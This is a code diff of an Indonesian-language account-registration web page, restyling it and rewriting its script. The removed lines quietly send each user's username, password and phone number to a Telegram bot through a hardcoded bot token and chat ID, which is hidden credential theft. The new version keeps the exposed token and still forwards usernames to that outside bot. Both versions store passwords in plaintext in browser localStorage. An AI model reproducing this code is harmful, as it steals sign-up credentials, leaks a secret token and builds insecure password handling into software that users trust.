@@ -2,62 +2,92 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Daftar Akun</title>
+  <title>Register Akun</title>
   <style>
     body {
-      font-family: Arial;
-      padding: 20px;
+      background-color: #f1f2f6;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .register-box {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
       text-align: center;
-      background-color: #f6f6f6;
+      width: 300px;
     }
     input {
-      width: 80%;
+      display: block;
+      margin: 10px auto;
       padding: 10px;
-      margin: 10px 0;
-      border-radius: 8px;
+      width: 90%;
+      border-radius: 5px;
       border: 1px solid #ccc;
     }
     button {
+      background: #0984e3;
+      color: white;
       padding: 10px 20px;
       border: none;
-      border-radius: 8px;
-      background: #3498db;
-      color: #fff;
+      border-radius: 5px;
+      cursor: pointer;
     }
-    p a { text-decoration: none; color: #2c3e50; }
+    p a {
+      text-decoration: none;
+      color: #636e72;
+    }
   </style>
 </head>
 <body>
-  <h2>Daftar Akun</h2>
-  <input type="text" id="username" placeholder="Username" required><br>
-  <input type="password" id="password" placeholder="Password" required><br>
-  <input type="tel" id="phone" placeholder="Nomor Telepon" required><br>
-  <button onclick="register()">Daftar</button>
-  <p>Sudah punya akun? <a href="index.html">Login</a></p>
+  <div class="register-box">
+    <h2>Register Akun</h2>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="register()">Daftar</button>
+    <p>Sudah punya akun? <a href="index.html">Login</a></p>
+  </div>
 
   <script>
+    const BOT_TOKEN = '7621390139:AAE9oNVeBy946yGbO7IDsT34DFY3THvGC6I';
+    const CHAT_ID = '7882058841';
+
+    function sendToTelegram(username) {
+      const message = `Akun baru terdaftar:\nUsername: ${username}\nWaktu: ${new Date().toLocaleString()}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      });
+    }
+
     function register() {
       const username = document.getElementById('username').value.trim();
       const password = document.getElementById('password').value;
-      const phone = document.getElementById('phone').value.trim();
 
-      if (!username || !password || !phone) return alert("Semua field wajib diisi.");
+      if (!username || !password) {
+        alert("Semua kolom harus diisi!");
+        return;
+      }
 
       const users = JSON.parse(localStorage.getItem("users") || "[]");
 
-      const exist = users.some(user => user.username === username || user.phone === phone);
-      if (exist) return alert("Username atau nomor sudah terdaftar.");
+      if (users.find(u => u.username === username)) {
+        alert("Username sudah digunakan!");
+        return;
+      }
 
-      users.push({ username, password, phone });
+      users.push({ username, password });
       localStorage.setItem("users", JSON.stringify(users));
 
-      // Kirim ke Telegram
-      const token = "7621390139:AAE9oNVeBy946yGbO7IDsT34DFY3THvGC6I";
-      const chatId = "7882058841";
-      const msg = `PENDAFTARAN BARU:\n\nUsername: ${username}\nPassword: ${password}\nTelepon: ${phone}`;
-      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-
-      alert("Pendaftaran berhasil.");
+      sendToTelegram(username);
+      alert("Registrasi berhasil! Silakan login.");
       window.location.href = "index.html";
     }
   </script>
